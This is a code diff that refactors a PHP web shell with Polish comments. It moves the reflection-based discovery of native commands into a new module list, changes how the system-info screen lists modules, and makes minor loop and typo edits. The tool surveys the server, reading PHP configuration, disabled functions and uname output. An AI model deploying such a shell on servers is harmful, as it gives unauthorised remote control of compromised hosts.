@@ -143,6 +143,17 @@ info - Wyświetla informacje o systemie';
 	private $aModules = array();
 
 	/**
+	 * Lista natywnych modulow
+	 *
+	 *  [komenda1] => nazwa_metody1
+	 *  [komenda2] => nazwa_metody1
+	 *
+	 * @access private
+	 * @var    string
+	 */
+	private $aNativeModules = array();
+
+	/**
 	 * Lista modulow
 	 *
 	 *  [Modul] => 'komenda1, komenda2'
@@ -335,7 +346,7 @@ info - Wyświetla informacje o systemie';
 				/**
 				 * Deszyfrowanie zawartosci pliku
 				 */
-				for( $i = 0; $i < $iDataLen; $i++ )
+				for( $i = 0; $i < $iDataLen; ++$i )
 				{
 					$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
 				}
@@ -345,7 +356,24 @@ info - Wyświetla informacje o systemie';
 		}
 
 		/**
-		 * Lista dostepnych modulow
+		 * Lista dostepnych modulow natywnych
+		 */
+		$oReflection = new ReFlectionClass( 'shell' );
+		$aHelpModules = $oReflection -> getMethods();
+
+		foreach( $aHelpModules as $oMethod )
+		{
+			$sMethod = $oMethod -> getName();
+
+			if( ! ( ( strncasecmp( $sMethod, 'getCommand', 10 ) === 0 ) && ( $sMethod !== 'getCommandCr3d1ts' ) ) )
+			{
+				continue ;
+			}
+			$this -> aNativeModules[ strtolower( substr( $sMethod, 10 ) ) ] = $sMethod;
+		}
+
+		/**
+		 * Lista dostepnych modulow zewnetrznych
 		 */
 		$aClasses = get_declared_classes();
 
@@ -422,7 +450,7 @@ info - Wyświetla informacje o systemie';
 				'Serwer: <strong>%s</strong><br />' .
 				'TMP: <strong>%s</strong><br />' .
 				'Zablokowane funkcje: <strong>%s</strong><br />' .
-				'Dostępne moduły: <strong>%s</strong>',
+				'Dostępne moduły: <strong><span class="green">%s</span>, %s</strong>',
 
 				phpversion(),
 				$this -> getStatus( $this -> bSafeMode, TRUE ),
@@ -431,7 +459,8 @@ info - Wyświetla informacje o systemie';
 				php_uname(),
 				$this -> sTmp,
 				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'Brak' : $sDisableFunctions ),
-				( ( ( $sModules = implode( ', ', array_map( create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ), array_keys( $this -> aHelpModules ) ) ) ) === '' ) ? 'Brak' : $sModules )
+				implode( ', ', array_keys( $this -> aNativeModules ) ),
+				( implode( ', ', array_map( create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ), array_keys( $this -> aHelpModules ) ) ) )
 		);
 	}
 
@@ -529,7 +558,7 @@ DATA;
 
 		$sNewData = NULL;
 
-		for( $i = 0; $i < $iDataLen; $i++ )
+		for( $i = 0; $i < $iDataLen; ++$i )
 		{
 			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
 		}
@@ -554,7 +583,7 @@ DATA;
 		return <<<DATA
 Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.
 
-Jakieś sugestie, pytania ? Pisz śmiało: Krzychu - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
+Jakieś sugestie, pytania? Pisz śmiało: Krzychu - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
 DATA;
 	}
 
@@ -636,24 +665,15 @@ DATA;
 		$sOutput .= "\r\n\r\n";
 
 		/**
-		 * Formatowanie natywnych helpow
-		 */
-		$oReflection = new ReFlectionClass( 'shell' );
-		$aHelpModules = $oReflection -> getMethods();
-
-		/**
 		 * Wymuszenie uzycia pliku pomocy dna natywnych polecen
 		 */
 		$this -> bHelp = TRUE;
 
-		foreach( $aHelpModules as $oMethod )
+		/**
+		 * Formatowanie natywnych helpow
+		 */
+		foreach( $this -> aNativeModules as $sModule => $sMethod  )
 		{
-			$sMethod = $oMethod -> getName();
-
-			if( ! ( ( strncasecmp( $sMethod, 'getCommand', 10 ) === 0 ) && ( $sMethod !== 'getCommandCr3d1ts' ) ) )
-			{
-				continue ;
-			}
 			$sOutput .= $this -> $sMethod( TRUE )  . "\r\n\r\n\r\n";
 		}
 
@@ -1251,7 +1271,7 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 /**
  * Wylaczanie wszystkich bufferow
  */
-for( $i = 0; $i < ob_get_level(); $i++ )
+for( $i = 0; $i < ob_get_level(); ++$i )
 {
 	ob_end_clean();
 }
